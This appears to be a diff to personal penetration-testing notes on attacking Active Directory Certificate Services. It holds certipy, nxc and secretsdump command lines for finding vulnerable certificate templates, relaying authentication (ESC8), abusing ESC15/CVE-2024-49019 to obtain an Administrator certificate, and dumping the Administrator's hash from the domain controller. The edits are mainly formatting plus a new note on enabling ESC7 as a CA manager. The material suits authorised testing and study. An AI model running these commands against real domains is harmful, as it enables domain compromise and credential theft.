@@ -9,7 +9,7 @@ Initial Check
 nxc ldap <victim_ip> -u 'user' -p 'password' -M adcs
 ```
 
-## Identify Vulnerable Template
+# Identify Vulnerable Template
 
 #### Certify.exe
 We can use `Certify.exe` to identify vulnerable services. The README has a walkthrough to enumerate and abuse certificate services
@@ -27,7 +27,8 @@ Based on the results, the README will guide on the actions to take
 Usage
 ```bash
 [export KRB5CCNAME=TGT.ccache] # If we want to do this via Kerberos, we need to generate or have a TGT first (nxc --generate-tgt OR get-TGT.py)... ignore otherwise
-certipy find -u 'DOMAIN\user' -p 'pass' [-hashes <NTLM>] [-k] -target <target> [-dc-ip <ip>] -text -stdout -vulnerable
+certipy find -u 'user@domain' -p 'pass' [-hashes <NTLM>] [-k] -target <target> [-dc-ip <ip>] -text -stdout -vulnerable
+	# Drop -vulnerable to see ALL if nothing showing up.
 
 # Look Here
 [!] Vulnerabilities
@@ -38,7 +39,7 @@ certipy find -u 'DOMAIN\user' -p 'pass' [-hashes <NTLM>] [-k] -target <target> [
 	# rusthound might pull more info... might not... It is potentially a deleted SID we can recover -- see AD Recycle Bin notes
 ```
 
-## ESC8
+### ESC8
 If present, you can get the machine to auth back to attacker, relay auth to ADCS and get a certificate as the machine account
 
 Attack
@@ -72,7 +73,7 @@ export KRB5CCNAME=<DC.ccache>
 KRB5CCNAME=<DC.ccache> secretsdump.py -k -no-pass '<domain>'/'<hostname>$'@'<FQDN>' -just-dc-user Administrator
 ```
 
-## ESC15
+### ESC15
 ESC15, also known by the community name “EKUwu” (research by Justin Bollinger from TrustedSec) and tracked as CVE-2024-49019, describes a vulnerability affecting unpatched CAs. It allows an attacker to inject arbitrary Application Policies into a certificate issued from a Version 1 (Schema V1) certificate template.
 
 _Requirements_ : 
@@ -100,3 +101,6 @@ certipy req -u <user> -p '<password>' -dc-ip <dc_ip> -target <target hostname> -
 # Auth as administrator
 certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
 ```
+
+# CA Managers
+If no templates are vulnerable but you are in a CA Manager group of some kind, you can manually enable ESC7.
